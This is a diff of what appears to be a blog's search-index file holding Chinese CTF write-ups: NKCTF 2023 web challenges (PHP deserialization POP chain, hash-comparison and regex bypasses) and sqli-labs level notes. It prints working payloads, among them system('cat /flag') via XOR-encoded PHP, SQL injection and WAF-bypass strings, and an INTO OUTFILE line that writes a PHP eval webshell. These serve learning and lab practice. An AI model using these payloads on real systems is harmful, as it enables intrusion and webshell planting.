class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里有很多匹配，需要将这些匹配全部都绕过，才能达到<code>eval($_POST[&#39;cmd&#39;]);</code>命令</p>
-<p>2.先看第一个</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-<p>这个可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=s1885207154a&amp;b=s1836677006a</span><br></pre></td></tr></table></figure>
-
-<p>这两个数值经过md5加密后，都是以0e开头的，以0e开头的数都等于0</p>
-<p>第二个</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>] != (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>])</span><br></pre></td></tr></table></figure>
-
-<p>这个通过搜到资料找到可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
-
-<p>第三个</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>] != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]) == <span class="number">114514</span></span><br></pre></td></tr></table></figure>
-
-<p>intval()函数是获取变量的整数值</p>
-<p>可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e=114514E13</span><br></pre></td></tr></table></figure>
-
-<p>intval()函数不会读取E后面的值，经过intval()函数处理后就等于114514</p>
-<p>第四个</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NS_CTF.go&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-<p>需要存在NS_CTF.go，但是传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code></p>
-<p>所以直接传参NS_CTF.go并不能行</p>
-<p>搜索发现当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，然后因为出错，点<code>.</code>就不会变成下划线<code>_</code></p>
-<p>第五个</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-<p>不能存在数字和字母</p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);&amp;_=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>以下摆出能生成异或查询脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="built_in">input</span>(<span class="string">&quot;Input key:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        result=i^j</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(result) <span class="keyword">is</span> key ):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;(&quot;&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;&quot;^&quot;&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;&quot;)==&#x27;</span>+<span class="built_in">chr</span>(result)+<span class="string">&#x27;   chr(&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)^chr(&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;)==&#x27;</span>+<span class="built_in">chr</span>(result))</span><br></pre></td></tr></table></figure>
-
-<p>例如</p>
-<p><img src="/2023/03/29/nkctf%20web/image-20230410215740449.png" alt="image-20230410215740449"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>mysql基础</title>
     <url>/2022/11/15/mysql%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>mysql基础</p>
@@ -972,57 +823,74 @@
 ]]></content>
   </entry>
   <entry>
-    <title>sqli-labs关卡</title>
-    <url>/2022/11/19/sqli-labs/</url>
-    <content><![CDATA[<p>简介</p>
+    <title>2023 nkctf的web部分解题</title>
+    <url>/2023/03/29/nkctf%20web/</url>
+    <content><![CDATA[<p>反序列化和绕过强，弱比较</p>
 <span id="more"></span>
 
-<p>数据库：security<br>表：emails,referers,uagents,users<br>列：USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
-<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>字符型 id&#x3D;’’</p>
-<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>数字型 id&#x3D;</p>
-<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>带括号的字符型 id&#x3D;(‘’)</p>
-<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>带括号的字符型 id&#x3D;(“”)</p>
-<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>字符型 id&#x3D;’’<br>需要使用布尔盲注 单引号</p>
-<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>字符型 id&#x3D;’’<br>使用布尔盲注 双引号</p>
-<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p><a href="http://localhost/sqli-labs-master/Less-7/?id=1&#39;">http://localhost/sqli-labs-master/Less-7/?id=1&#39;</a>)) union select 1,2,”<?php @eval($_POST['pass']);?>“ into outfile “E:\phpstudy\phpstudy_pro\WWW\sqli-labs-master\Less-7\pass.php”–+<br>使用文件上传</p>
-<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>字符型  id&#x3D;’’<br>使用布尔盲注</p>
-<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>时间延迟  单引号</p>
-<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>时间延迟  双引号</p>
-<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><p>post注入 字符型<br>id&#x3D;’’</p>
-<h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p>post注入<br>id&#x3D;(“”)<br>uname&#x3D;&amp;passwd&#x3D;1”) union select 1,2#&amp;submit&#x3D;Submit</p>
-<h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><p>post的报错型注入<br>使用’)</p>
-<h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><p>post的报错型注入<br>和十三关相似<br>使用”</p>
-<h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>post的时间延迟注入<br>使用’</p>
-<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h3><p>post的时间延迟注入<br>使用”）</p>
-<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>username进行了过滤  可以在password进行注入<br>先输入对的username<br>再进行报错型注入<br>使用’<br>‘and extractvalue(1,concat(0x7e,(select database()))) and’1’&#x3D;’1</p>
-<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>需要登录正确的username和password<br>username和password都存在过滤<br>去User-Agent进行注入，先将values进行闭合<br>使用报错型注入<br>User-Agent: 1’,1,updatexml(1,concat(0x5e,database()),1))#<br>或者<br>User-Agent: ‘and extractvalue(1,concat(0x7e,(select database()))) and’1’&#x3D;’1</p>
-<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>需要登录正确的username和password<br>去Referer进行注入，先将values进行闭合<br>使用报错型注入<br>Referer: 1’,updatexml(1,concat(0x5e,database()),1))#</p>
-<h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h3><p>需要登录正确的username和password<br>去cookie进行注入<br>使用联合注入<br>Cookie: uname&#x3D;’ union select 1,2,database()#</p>
-<h3 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h3><p>需要登录正确的username和password<br>去cookie进行注入<br>使用联合注入<br>但这里有base64编码<br>原注入语句为’) union select 1,group_concat(schema_name),3 from information_schema.schemata #<br>需要进行编码为JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhICM&#x3D;<br>Cookie: uname&#x3D;’) union select 1,group_concat(schema_name),3 from information_schema.schemata #</p>
-<h3 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h3><p>需要登录正确的username和password<br>去cookie进行注入<br>使用联合注入<br>但这里有base64编码<br>原注入语句为” union select 1,group_concat(schema_name),3 from information_schema.schemata #<br>需要进行编码，和第二十一关差不多</p>
-<h3 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h3><p>过滤了注释<br>使用?id&#x3D;-1’ union select 1,database(),3 or ‘1’&#x3D;’1来获取数据库，3 or ‘1’&#x3D;’1是一体的只会返回1</p>
-<h3 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h3><p>二次注入<br>注册admin’# php会对其进行转义保存进数据库中<br>修改admin’#的密码相当于修改admin的密码此时语句变成了’admin’#’</p>
-<h3 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h3><p>将or和and过滤了<br>进行get注入<br>使用?id&#x3D;1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’–+<br>但or和and过滤，而information_schema.tables中有or需要写成infoorrmation_schema.tables</p>
-<h3 id="第二十五a关"><a href="#第二十五a关" class="headerlink" title="第二十五a关"></a>第二十五a关</h3><p>字符型<br>将or和and过滤了<br>使用get的普通注入就可以</p>
-<h3 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h3><p>使用 “%a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”<br>过滤了空格，or，and，&#x2F;<br>使用报错型注入<br>?id&#x3D;1’||updatexml(1,concat(0x7e,(SELECT(group_concat(table_name))FROM(infoorrmation_schema.tables)WHERE(table_schema&#x3D;’security’))),1)||’1’&#x3D;’1</p>
-<h3 id="第二十六a关"><a href="#第二十六a关" class="headerlink" title="第二十六a关"></a>第二十六a关</h3><p>使用布尔盲注脚本<br>空格绕过无法使用<br>无法使用报错型注入，无报错内容<br>空格，or，and，&#x2F;&#x2F;都被过滤<br><a href="http://localhost/sqli-labs-master/Less-26a/?id=1&#39;aandnd(substr((select(group_concat(0x3a,0x3a,id,username))from(users)),%d,1)=&#39;%s&#39;)aandnd&#39;1">http://localhost/sqli-labs-master/Less-26a/?id=1&#39;aandnd(substr((select(group_concat(0x3a,0x3a,id,username))from(users)),%d,1)=&#39;%s&#39;)aandnd&#39;1</a></p>
-<h3 id="第二十七关"><a href="#第二十七关" class="headerlink" title="第二十七关"></a>第二十七关</h3><p>使用单引号<br>过滤了&#x2F;<em><em>&#x2F;,#,union,select,空格<br>使用绕过<a href="http://localhost:8088/sqlilabs/Less-27/?id=0&#39;/">http://localhost:8088/sqlilabs/Less-27/?id=0&#39;/</a></em>%0a*&#x2F;UnIoN&#x2F;*%0a</em>&#x2F;SeLeCt&#x2F;<em>%0a</em>&#x2F;2,database(),4&#x2F;<em>%0a</em>&#x2F;||&#x2F;<em>%0a</em>&#x2F;‘1’&#x3D;’1<br>&#x2F;<em>%0a</em>&#x2F;强行制造空格，后面进行单引号闭合</p>
-<h3 id="第二十七a关"><a href="#第二十七a关" class="headerlink" title="第二十七a关"></a>第二十七a关</h3><p>使用双引号<br>和二十七关差不多</p>
-<p>过滤<br>1.注释符号被过滤：使用or ‘a’&#x3D;’b的方式来绕过<br>2.空格被过滤：使用%a0空格，%a0换行，%09tab键，%0c来绕过<br>3.and和or被绕过：用&amp;&amp;和||来代替<br>4.union和select被绕过：使用sElect，uniOn等来代替</p>
-<h3 id="第二十八关"><a href="#第二十八关" class="headerlink" title="第二十八关"></a>第二十八关</h3><p>union select组合被过滤，不能使用组合<br>使用<a href="http://localhost/sqli-labs-master/Less-28a/?id=a&#39;)%0aunion%0aunion%0aselectselect%0a1,2,database();%00">http://localhost/sqli-labs-master/Less-28a/?id=a&#39;)%0aunion%0aunion%0aselectselect%0a1,2,database();%00</a></p>
-<h3 id="第二十八a关"><a href="#第二十八a关" class="headerlink" title="第二十八a关"></a>第二十八a关</h3><p>和二十八关一样</p>
-<h3 id="第二十九关"><a href="#第二十九关" class="headerlink" title="第二十九关"></a>第二十九关</h3><p>使用’<br>WAF绕过<br>在页面使用联合注入那么就和第一关一样<br>在源文件中有login.php在其中进行注入<br><a href="http://127.0.0.1/sql1/Less-29/login.php?id=1%E5%8F%AF%E4%BB%A5%E5%9B%9E%E6%98%BE">http://127.0.0.1/sql1/Less-29/login.php?id=1可以回显</a><br>使用<a href="http://127.0.0.1/sql1/Less-29/login.php?id=1&#39;%E6%98%BE%E7%A4%BA%E8%A2%ABwaf%E6%8B%A6%E4%B8%8B">http://127.0.0.1/sql1/Less-29/login.php?id=1&#39;显示被waf拦下</a><br>再使用<a href="http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=2%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87waf%E7%84%B6%E5%90%8E%E5%9B%9E%E6%98%BE">http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=2可以绕过waf然后回显</a><br>然后进行正常的注入<a href="http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=0&#39;">http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=0&#39;</a> union select 1,2,3–+</p>
-<h3 id="第三十关"><a href="#第三十关" class="headerlink" title="第三十关"></a>第三十关</h3><p>和第二十九关一样<br>使用”</p>
-<h3 id="第三十一关"><a href="#第三十一关" class="headerlink" title="第三十一关"></a>第三十一关</h3><p>和第二十九关一样<br>使用”)</p>
-<h3 id="第三十二关"><a href="#第三十二关" class="headerlink" title="第三十二关"></a>第三十二关</h3><p>GBK双字节编码：一个汉字用两个字节表示<br>宽字节绕过引号转义<br>会在’前面自动添加<br>使用%df’ php自动处理后为%df&#39;<br>%df\连接变为一个汉字，这样就可以单引号逃逸<br><a href="http://localhost/sqli-labs-master/Less-32/?id=%EF%BF%BD&#39;">http://localhost/sqli-labs-master/Less-32/?id=%df&#39;</a> union select 1,2,3–+<br>后面爆表的时候table_schema&#x3D;’数据库’  可以将’数据库’改为使用十六进制</p>
-<h3 id="第三十三关"><a href="#第三十三关" class="headerlink" title="第三十三关"></a>第三十三关</h3><p>和第三十二关一样</p>
-<h3 id="第三十四关"><a href="#第三十四关" class="headerlink" title="第三十四关"></a>第三十四关</h3><p>为post的斜杠转义，但转义方式与get型的不相同<br>uname&#x3D;%df’ union select 1,2#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit<br>不能使用hackbar，会自动将%df的%换成%25，变为%25df，post无法将其再次解码为%<br>使用burp来注入</p>
-<h3 id="第三十五关"><a href="#第三十五关" class="headerlink" title="第三十五关"></a>第三十五关</h3><p>数字型<br>直接使用联合注入<br>table_schema&#x3D;’数据库’的’数据库’使用十六进制</p>
-<h3 id="第三十六关"><a href="#第三十六关" class="headerlink" title="第三十六关"></a>第三十六关</h3><p>和第三十二关一样</p>
-<h3 id="第三十七关"><a href="#第三十七关" class="headerlink" title="第三十七关"></a>第三十七关</h3><p>和第三十五关一样</p>
-<h3 id="第三十八关"><a href="#第三十八关" class="headerlink" title="第三十八关"></a>第三十八关</h3><p>使用’<br>堆叠查询注入<br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开</p>
-<h3 id="第三十九关"><a href="#第三十九关" class="headerlink" title="第三十九关"></a>第三十九关</h3><p>数字型<br>和三十八关一样</p>
-<h3 id="第四十关"><a href="#第四十关" class="headerlink" title="第四十关"></a>第四十关</h3><p>使用’)<br>可以使用联合注入也可以使用布尔盲注<br>没有报错，无法使用报错型注入</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>1.首先是源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ItS SO CREAZY&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;arg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有unserialize()函数，一看就是一个反序列化，还有__destruct()函数，使用反序列化函数时会自动调用这个函数</p>
+<p>2.这道题的pop链逻辑比较简单，使用的魔术方法也比较少</p>
+<p>直接来构造pop链</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unserialize() =&gt; __destruct() -&gt; $arg =&gt; __toString() -&gt; $func =&gt; __invoke() -&gt; eval($shell($cmd))</span><br></pre></td></tr></table></figure>
+
+<p>直接上payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;welcome_to_NKCTF&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;more /[e-h][k-m][0-b][e-h]&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$we</span>=<span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$ha</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$ho</span>=<span class="keyword">new</span> <span class="title class_">Hell0</span>();</span><br><span class="line"><span class="variable">$we</span>-&gt;arg=<span class="variable">$ho</span>;</span><br><span class="line"><span class="variable">$we</span>-&gt;arg-&gt;func=<span class="variable">$ha</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$we</span>));</span><br></pre></td></tr></table></figure>
+
+<p>3.这里主要的难点是一个正则匹配</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个正则匹配的意思是匹配f，l，a，g，*，?这几个字符，并且不区分大小写，</p>
+<p>读取flag文件，通常会使用cat，但是cat中含有a字符，可以用more来代替cat</p>
+<p>接下来就是考虑可以用什么来代替flag，这里看wp知道glob通配符</p>
+<p>看ascii码表，f位于e和h之间，l位于k和m之间，a可以当成在0和b之间，g在e和h之间</p>
+<p><img src="/2023/03/29/nkctf%20web/image-20230403210845208.png" alt="image-20230403210845208"></p>
+<p>所以flag可以使用<code>[e-h][k-m][0-b][e-h]</code>来代替</p>
+<h2 id="绕过强，弱比较"><a href="#绕过强，弱比较" class="headerlink" title="绕过强，弱比较"></a>绕过强，弱比较</h2><p>1.上源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>] != (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>] != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]) == <span class="number">114514</span>)&#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NS_CTF.go&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//                phpinfo();</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span 